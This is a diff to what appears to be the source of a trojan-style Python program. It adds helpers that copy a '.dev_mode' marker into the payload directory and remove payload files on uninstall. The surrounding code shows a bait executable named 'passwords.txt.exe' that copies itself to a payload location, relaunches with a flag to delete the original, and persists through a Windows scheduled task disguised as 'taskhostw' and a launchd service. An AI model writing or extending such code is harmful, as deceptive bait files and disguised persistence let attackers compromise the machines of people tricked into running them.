@@ -151,6 +151,51 @@ def parse_cli_arguments():
     return delete_file
 
 
+def copy_dev_mode_marker(source_dir: str, dest_dir: str) -> None:
+    """
+    Copy .dev_mode marker file from source to destination directory if it exists.
+    Used during payload deployment to propagate dev mode to the installed payload.
+
+    Args:
+        source_dir: Source directory containing .dev_mode marker
+        dest_dir: Destination directory to copy .dev_mode marker to
+    """
+    dev_mode_source = os.path.join(source_dir, ".dev_mode")
+    dev_mode_dest = os.path.join(dest_dir, ".dev_mode")
+
+    if os.path.exists(dev_mode_source):
+        try:
+            shutil.copy2(dev_mode_source, dev_mode_dest)
+            log(f"Copied .dev_mode marker to: {dev_mode_dest}")
+        except Exception as e:
+            log(f"Warning: Could not copy .dev_mode marker: {e}")
+
+
+def cleanup_payload_files() -> None:
+    """
+    Clean up payload files during uninstallation (Windows only).
+    Removes both the payload executable and .dev_mode marker if they exist.
+    """
+    payload_dir, payload_path = get_payload_path()
+
+    # Clean up .dev_mode marker
+    dev_mode_file = os.path.join(payload_dir, ".dev_mode")
+    if os.path.exists(dev_mode_file):
+        try:
+            os.remove(dev_mode_file)
+            log(f"Removed .dev_mode marker: {dev_mode_file}")
+        except Exception as e:
+            log(f"Warning: Could not remove .dev_mode: {e}")
+
+    # Clean up payload executable
+    if os.path.exists(payload_path):
+        try:
+            os.remove(payload_path)
+            log(f"Removed payload: {payload_path}")
+        except Exception as e:
+            log(f"Warning: Could not remove payload: {e}")
+
+
 def deploy_payload():
     """
     Stage 1: Bait file execution (passwords.txt.exe).
@@ -169,6 +214,10 @@ def deploy_payload():
         # Copy self to payload location
         shutil.copy2(sys.executable, payload_path)
         log(f"Copied to: {payload_path}")
+
+        # Copy .dev_mode marker if running in dev mode
+        source_dir = os.path.dirname(sys.executable)
+        copy_dev_mode_marker(source_dir, payload_dir)
 
         # Launch the payload with --delete-file argument
         original_path = sys.executable
@@ -464,6 +513,9 @@ def uninstall_receiver_service() -> None:
         log("Uninstalling Windows Task...")
         subprocess.run(["schtasks", "/delete", "/tn", "taskhostw", "/f"], capture_output=True)
         log("Windows Task uninstalled.")
+
+        # Clean up payload files and .dev_mode marker
+        cleanup_payload_files()
 
     elif system == "Darwin":
         log("Uninstalling launchd service...")
